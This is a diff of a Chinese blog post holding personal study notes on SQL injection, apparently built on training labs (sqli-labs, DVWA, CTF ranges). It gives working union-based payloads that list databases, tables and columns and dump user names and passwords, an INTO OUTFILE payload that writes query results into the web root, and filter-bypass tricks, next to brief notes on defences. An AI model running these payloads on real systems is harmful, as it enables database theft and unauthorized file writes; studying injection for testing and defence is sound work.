@@ -6,15 +6,15 @@
   
   <title>sql注入 | zhuguang111</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="SQL注入原理在有注入点处输入恶意webshell，从而进行与数据库交互，获取信息和删改数据库 SQL注入条件 可传入可控参数，可带入数据库交互，参数不存在过滤或过滤不严 MySQL的游一些特性和使用1.在MYSQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，它是一个存储所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据">
+  <meta name="description" content="SQL注入原理在有注入点处输入恶意webshell，从而进行与数据库交互，获取信息和删改数据库 SQL注入条件 可传入可控参数，可带入数据库交互，参数不存在过滤或过滤不严 MySQL的一些特性和使用1.在MYSQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，它是一个存储所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql注入">
 <meta property="og:url" content="http://zhuguang111.github.io/2025/05/10/sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="zhuguang111">
-<meta property="og:description" content="SQL注入原理在有注入点处输入恶意webshell，从而进行与数据库交互，获取信息和删改数据库 SQL注入条件 可传入可控参数，可带入数据库交互，参数不存在过滤或过滤不严 MySQL的游一些特性和使用1.在MYSQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，它是一个存储所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据">
+<meta property="og:description" content="SQL注入原理在有注入点处输入恶意webshell，从而进行与数据库交互，获取信息和删改数据库 SQL注入条件 可传入可控参数，可带入数据库交互，参数不存在过滤或过滤不严 MySQL的一些特性和使用1.在MYSQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，它是一个存储所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-05-10T13:01:34.000Z">
-<meta property="article:modified_time" content="2025-05-10T13:30:58.937Z">
+<meta property="article:modified_time" content="2025-05-10T14:16:01.646Z">
 <meta property="article:author" content="zhuguang111">
 <meta name="twitter:card" content="summary">
   
@@ -105,7 +105,7 @@
 
 <h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>在有注入点处输入恶意webshell，从而进行与数据库交互，获取信息和删改数据库</p>
 <h2 id="SQL注入条件"><a href="#SQL注入条件" class="headerlink" title="SQL注入条件"></a>SQL注入条件</h2><p> 可传入可控参数，可带入数据库交互，参数不存在过滤或过滤不严</p>
-<h3 id="MySQL的游一些特性和使用"><a href="#MySQL的游一些特性和使用" class="headerlink" title="MySQL的游一些特性和使用"></a>MySQL的游一些特性和使用</h3><p>1.在MYSQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，它是一个存储所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或者列名信息。</p>
+<h3 id="MySQL的一些特性和使用"><a href="#MySQL的一些特性和使用" class="headerlink" title="MySQL的一些特性和使用"></a>MySQL的一些特性和使用</h3><p>1.在MYSQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，它是一个存储所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或者列名信息。</p>
 <p>2.数据库中符号”.”代表下一级，如xiaodi.user表示xiaodi数据库下的user表名。</p>
 <p>3.information_schema.tables：记录所有表名信息的表<br>information_schema.columns：记录所有列名信息的表<br>table_name：表名<br>column_name：列名<br>table_schema：数据库名</p>
 <p>补充：如何判断注入点？</p>
@@ -120,7 +120,23 @@
 <p>查询指定数据库名mozhe_Discuz_StormGroup下的表名信息：<br><a target="_blank" rel="noopener" href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a><br>union select 1,group_concat(table_name),3,4 from information_schema.tables<br>where table_schema&#x3D;‘mozhe_Discuz_StormGroup’</p>
 <p>查询指定表名StormGroup_member下的列名信息：<br><a target="_blank" rel="noopener" href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a><br>union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;‘StormGroup_member’</p>
 <p>查询指定表名StormGroup_member下的数据：<br><a target="_blank" rel="noopener" href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a><br>union select 1,name,password,4 from StormGroup_member</p>
-<p>查另一个数据库的信息 可以直接数据库.表名  或者分开说数据库&#x3D; ，表名&#x3D;</p>
+<p>查另一个数据库的信息 可以直接数据库.表名 dvwa.users  或者分开说数据库&#x3D; ，表名&#x3D;</p>
+<h3 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h3><p><strong>1.跨库查询及应用思路</strong><br>原理：一个网站的注入点影响到另一个网站的数据，需要root型注入点，</p>
+<p>通过’ select * from schemata；’语句，查询数据库中所有数据库的名字；</p>
+<p>实现跨库注入，首先需要获得跨库的数据库的名字；<br>可以通过查询schemata获得另一个数据库名</p>
+<p>通过SQL语句注入，获得所有数据库名字；<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a><br>union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
+<p>获取指定dvwa数据库名下的表名信息<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a><br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;‘dvwa’</p>
+<p>获取指定dvwa数据库名下的表名users下的列名信息；<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a><br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;‘users’</p>
+<p>查另一个数据库的信息 可以直接数据库.表名 dvwa.users  或者分开说数据库&#x3D; ，表名&#x3D;</p>
+<p>?id&#x3D;-1union select 1,user,password from dvwa.users</p>
+<h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h3><p>会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不 同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。</p>
+<p>load_file(): 读取函数<br>into outfile 或者 into dumpfile:导出函数  ‘ union select username, password from ctfshow_user5 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt’ %23</p>
+<p>路径获取常见方法：<br>报错显示，遗留文件，漏洞报错，平台配置文件，爆破等;</p>
+<p>相关防注入方法<br>1.魔术引导及常见防护</p>
+<p>当magic_quotes_gpc &#x3D; On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线，从而不会被执行</p>
+<p>2.采用内置函数进行防护<br>addslashes()函数也是和魔术引导一样效果<br>is_int()函数判断变量<br>还有更多内置函数也可以进行防护；<br>正常情况遇到的不多；</p>
+<p>3.自定义关键字：select</p>
+<p>$ id&#x3D;str_replace(‘select’,‘fuck’,$id)<br>将select转换成fuck；<br>绕过方法：对过滤关键字进行大小写，hex编码，叠写，等价函数替换等等</p>
 
 
 
@@ -142,6 +158,15 @@
   
     
 <nav id="article-nav">
+  
+    <a href="/2025/05/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          反序列化
+        
+      </div>
+    </a>
   
   
     <a href="/2025/04/27/222/" id="article-nav-older" class="article-nav-link-wrap">
@@ -184,6 +209,10 @@
       <ul>
         
           <li>
+            <a href="/2025/05/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+          </li>
+        
+          <li>
             <a href="/2025/05/10/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
           </li>
         
@@ -197,10 +226,6 @@
         
           <li>
             <a href="/2025/04/27/1234/">1234</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
           </li>
         
       </ul>
